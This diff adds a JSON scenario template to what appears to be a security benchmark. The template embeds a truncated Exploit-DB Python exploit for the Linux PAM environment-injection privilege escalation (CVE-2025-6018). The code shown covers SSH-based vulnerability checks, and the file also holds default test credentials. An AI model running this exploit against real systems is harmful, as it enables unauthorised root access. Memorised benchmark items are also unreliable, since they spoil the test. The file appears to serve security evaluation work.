@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_52386",
+  "category": "B1_ld_preload",
+  "attack_technique": "T1574.006",
+  "cwe": "CWE-427",
+  "description": "Linux privilege escalation: Linux PAM Environment - Variable Injection Local Privilege Escalation (CVE-2025-6018)\n\nExploit source code (52386.py):\n```\n# Exploit Title: Linux PAM Environment - Variable Injection Local Privilege Escalation\n# Exploit Author: @İbrahimsql\n# Exploit Author's github: https://github.com/ibrahmsql\n# Description: PAM pam_env.so module allows environment variable injection via ~/.pam_environment\n#              leading to privilege escalation through SystemD session manipulation\n# CVE: CVE-2025-6018, CVE-2025-6019\n# Vendor Homepage: https://github.com/linux-pam/linux-pam\n# Software Link: https://github.com/linux-pam/linux-pam/releases\n# Version: PAM 1.3.0 - 1.6.0 (vulnerable versions)\n# Category: Local Privilege Escalation\n# Requirements: paramiko>=2.12.0\n# Usage: python3 cve_2025_6018_professional.py -i target_ip -u username -p password\n# References:\n#   - https://access.redhat.com/security/cve/CVE-2025-6018\n#   - https://bugzilla.redhat.com/show_bug.cgi?id=2372693\n#   - https://bugzilla.suse.com/show_bug.cgi?id=1243226\n\nimport paramiko\nimport time\nimport sys\nimport socket\nimport argparse\nimport logging\nfrom datetime import datetime\n\n# Setup logging\nlogging.basicConfig(\n    level=logging.INFO,\n    format='%(asctime)s [%(levelname)s] %(message)s',\n    datefmt='%Y-%m-%d %H:%M:%S',\n    handlers=[\n        logging.FileHandler('cve_2025_6018_exploit.log'),\n        logging.StreamHandler(sys.stdout)\n    ]\n)\nlogger = logging.getLogger(__name__)\n\nclass CVEExploit:\n    def __init__(self):\n        self.vulnerable_versions = [\n            \"pam-1.3.0\", \"pam-1.3.1\", \"pam-1.4.0\", \"pam-1.5.0\",\n            \"pam-1.5.1\", \"pam-1.5.2\", \"pam-1.5.3\", \"pam-1.6.0\"\n        ]\n\n    def check_vulnerability(self, client):\n        \"\"\"Enhanced vulnerability detection\"\"\"\n        logger.info(\"Starting vulnerability assessment\")\n\n        checks = {\n            \"pam_version\": \"rpm -q pam || dpkg -l | grep libpam\",\n            \"pam_env\": \"find /etc/pam.d/ -name '*' -exec grep -l 'pam_env' {} \\\\; 2>/dev/null\",\n            \"pam_systemd\": \"find /etc/pam.d/ -name '*' -exec grep -l 'pam_systemd' {} \\\\; 2>/dev/null\",\n            \"systemd_version\": \"systemctl --version | head -1\"\n        }\n\n        vulnerable = False\n\n        for check_name, command in checks.items():\n            logger.info(f\"Executing check: {check_name}\")\n            try:\n                stdin, stdout, stderr = client.exec_command(command, timeout=10)\n                output = stdout.read().decode().strip()\n\n                if check_name == \"pam_version\":\n                    for vuln_ver in self.vulnerable_versions:\n                        if vuln_ver in output:\n                            logger.info(f\"Vulnerable PAM version detected: {vuln_ver}\")\n                            vulnerable = True\n                            break\n\n                elif check_name == \"pam_env\" and output:\n                    logger.info(\"pam_env.so configuration found\")\n                    vulnerable = True\n\n                elif check_name == \"pam_systemd\" and output:\n                    logger.info(\"pam_systemd.so found - escalation vector available\")\n\n               \n```",
+  "cve": "CVE-2025-6018",
+  "exploitdb_id": "52386",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_52386",
+      "type": "core",
+      "difficulty": "hard"
+    }
+  ]
+}
